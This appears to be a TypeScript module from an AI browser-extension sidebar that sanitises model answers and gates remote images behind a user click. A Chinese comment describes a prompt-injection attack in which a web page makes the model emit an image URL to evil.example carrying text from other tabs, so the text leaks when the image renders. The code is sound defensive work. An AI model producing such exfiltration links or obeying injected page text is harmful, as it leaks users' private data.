import DOMPurify from "dompurify";

/**
 * 模型写的回答正文（Markdown 渲染后的 HTML）怎么消毒。回答里的字可能来自网页（提示注入），
 * 所以正文只能改它自己那一块的样子：没有 <style>、style 属性、class、id、data-*，没有表单控件、内嵌页面和 SVG。
 * 也没有 hidden：看不见的字会被「复制为表格」「复制」一起复制走。
 * 只留 Markdown 本身会产出的标签和属性，加上几种常见的行内写法（<kbd>、<details> 等）。
 * 卡片、代码块的条等界面由我们自己在消毒之后加，不走这里。
 */
const TAGS = [
  "a", "abbr", "b", "bdi", "bdo", "blockquote", "br", "caption", "cite", "code", "col", "colgroup", "dd", "del", "details", "dfn", "div", "dl", "dt",
  "em", "figcaption", "figure", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "img", "input", "ins", "kbd", "li", "mark", "ol", "p", "pre", "q",
  "rp", "rt", "ruby", "s", "samp", "small", "span", "strong", "sub", "summary", "sup", "table", "tbody", "td", "tfoot", "th", "thead", "time", "tr",
  "u", "ul", "var", "wbr",
];

const ATTRS = ["href", "title", "alt", "src", "width", "height", "align", "colspan", "rowspan", "start", "reversed", "type", "checked", "disabled", "open", "lang", "dir", "datetime", "scope", "class"];

/**
 * images=false 时不留图片（网页里的提问框：图片会从用户所在的网页发请求）。
 * class 只留 marked 给代码块写的 language-*：别的 class 能借用侧栏自己的样式（固定定位、遮罩）。
 * input 只留 marked 任务列表那种勾选框，并且不能点。
 * 链接只留绝对的 http(s) 和 mailto：相对地址在扩展页面里会解析成 chrome-extension:// 下的页面。
 * 网上的图片换成「点开看」的占位，见 gateImage。
 */
export function sanitizeAnswerHtml(html: string, { images = true }: { images?: boolean } = {}): string {
  const fragment = DOMPurify.sanitize(html, { ALLOWED_TAGS: images ? TAGS : TAGS.filter((tag) => tag !== "img"), ALLOWED_ATTR: ATTRS, ALLOW_DATA_ATTR: false, RETURN_DOM_FRAGMENT: true });

  for (const el of fragment.querySelectorAll("[class]")) {
    const keep = el.tagName === "CODE" ? [...el.classList].filter((name) => /^language-\S+$/.test(name)) : [];

    if (keep.length) el.className = keep.join(" ");
    else el.removeAttribute("class");
  }

  for (const a of fragment.querySelectorAll("a[href]")) {
    if (!/^(https?:\/\/|mailto:)/i.test((a.getAttribute("href") ?? "").trim())) a.removeAttribute("href");
  }

  for (const input of fragment.querySelectorAll("input")) {
    if (input.getAttribute("type") === "checkbox") input.setAttribute("disabled", "");
    else input.remove();
  }

  for (const img of fragment.querySelectorAll("img")) gateImage(img);

  const template = document.createElement("template");
  template.content.append(fragment);

  return template.innerHTML;
}

/**
 * 网页能借提示注入让模型写出 ![](https://evil.example/?d=别的标签页里的字)：图片一显示就把字发出去，用户什么都没点。
 * 所以 http(s) 图片先不放 src，换成占位，用户真点了才加载。data: 和 blob: 不出网，照常显示。
 * 占位靠 data-answer-image 认：消毒时模型写的 data-* 全被删掉，带这个属性的只能是这里建的。
 */
const GATE = "data-answer-image";

const GATE_ALT = "data-answer-image-alt";

function gateImage(img: HTMLImageElement): void {
  let url: URL;

  try {
    url = new URL(img.getAttribute("src") ?? "");
  } catch {
    return;
  }

  if (url.protocol !== "http:" && url.protocol !== "https:") return;
  const placeholder = img.ownerDocument.createElement("button");
  placeholder.type = "button";
  placeholder.className = "answer-image-gate";
  placeholder.setAttribute(GATE, url.href);
  const alt = img.getAttribute("alt");

  if (alt) placeholder.setAttribute(GATE_ALT, alt);
  placeholder.title = url.href;
  placeholder.textContent = ["图片", url.host, ...(carriesData(url) ? ["带参数"] : []), "点开看"].join(" · ");
  img.replaceWith(placeholder);
}

/** 地址里能夹带字的地方：查询串，或比 /logo.png 这种文件名长得多的路径。占位上标出来，用户点之前知道请求会带东西出去。 */
function carriesData(url: URL): boolean {
  return url.search.length > 1 || url.pathname.length > 24;
}

/** 复制回答时占位不算正文：换成图片的说明，没有就写「[图片]」。 */
export function imagePlaceholdersAsText(root: ParentNode): void {
  for (const placeholder of root.querySelectorAll(`[${GATE}]`)) placeholder.replaceWith(placeholder.getAttribute(GATE_ALT) || "[图片]");
}

function loadedImage(placeholder: Element): HTMLImageElement {
  const img = document.createElement("img");
  img.alt = placeholder.getAttribute(GATE_ALT) ?? "";
  img.src = placeholder.getAttribute(GATE)!;

  return img;
}

/** 每段回答里用户点开过的图片地址。流式时正文每一帧整段换新，换新时按这里把点开过的直接显示成图片；重开侧栏后为空，又是占位。 */
const opened = new WeakMap<Node, Set<string>>();

/** 放进 answer 之前调用：root 里用户在这段回答点开过的占位直接换成图片。 */
export function keepOpenedImages(root: ParentNode, answer: Node): void {
  const urls = opened.get(answer) ?? new Set<string>();
  opened.set(answer, urls);

  for (const placeholder of root.querySelectorAll(`[${GATE}]`)) if (urls.has(placeholder.getAttribute(GATE)!)) placeholder.replaceWith(loadedImage(placeholder));
}

/** 用户真点了占位才加载：脚本调用 click() 的 isTrusted 是 false，不算。 */
export function openGatedImage(event: MouseEvent): void {
  if (!event.isTrusted || !(event.target instanceof Element)) return;
  const placeholder = event.target.closest(`button[${GATE}]`);

  if (!placeholder) return;

  for (let node: Node | null = placeholder.parentNode; node; node = node.parentNode) opened.get(node)?.add(placeholder.getAttribute(GATE)!);
  placeholder.replaceWith(loadedImage(placeholder));
}
